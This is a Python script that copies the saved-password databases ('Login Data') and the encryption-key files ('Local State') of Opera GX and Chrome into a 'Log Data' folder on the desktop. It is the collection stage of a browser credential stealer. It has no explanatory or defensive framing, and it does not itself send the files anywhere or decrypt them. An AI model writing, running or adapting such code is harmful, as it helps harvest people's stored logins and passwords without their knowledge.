import os
import shutil
import time

# Retrieve the current username
username = os.getlogin()

# Construct the desktop path
desktop_path = os.path.join('C:\\Users', username, 'OneDrive', 'Desktop')
log_data_folder = os.path.join(desktop_path, 'Log Data')

# Create the Log Data folder on the desktop
os.makedirs(log_data_folder, exist_ok=True)

# Define the target file paths
source_file_2 = os.path.join('C:\\Users', username, 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Local State')
source_file_3 = os.path.join('C:\\Users', username, 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Login Data')
source_file_4 = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
source_file_chrome = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')

# Copy individual files with unique names and prefixes to the Log Data folder
def copy_file(source_file, prefix):
    file_name = os.path.basename(source_file)
    timestamp = int(time.time())
    unique_name = f"{prefix}_{file_name}_{timestamp}"
    destination_path = os.path.join(log_data_folder, unique_name)
        
    try:
        shutil.copy2(source_file, destination_path)
        print(f"Copied: {unique_name}")
    except Exception as e:
        print(f"Error copying {unique_name}: {str(e)}")

# Copy files from all specified paths to the Log Data folder with appropriate prefixes
copy_file(source_file_2, "Opera")
copy_file(source_file_3, "Opera")
copy_file(source_file_4, "Chrome")
copy_file(source_file_chrome, "Chrome")

print("Files copied to Log Data folder on the desktop.")
